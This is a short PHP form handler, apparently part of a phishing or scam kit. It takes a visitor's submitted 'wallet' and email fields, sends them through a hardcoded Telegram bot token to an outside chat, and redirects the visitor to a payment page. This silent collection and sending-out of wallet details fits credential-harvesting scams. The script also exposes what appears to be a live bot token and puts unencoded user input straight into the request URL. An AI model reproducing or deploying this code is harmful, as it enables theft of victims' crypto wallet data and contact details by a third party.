<?php

/* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXX/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */


$phone = $_POST['wallet'];
$address = $_POST['email'];

$token ="6506875842:AAEQWVUOY06aY3Tfds3Iju0nur6gcONdt6g";
$chat_id ="-4046237864";

$arr = array(
  'Wallet:' => $phone,
  'Email:' => $address
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: payment.html');
} else {
  echo "Error";
}
?>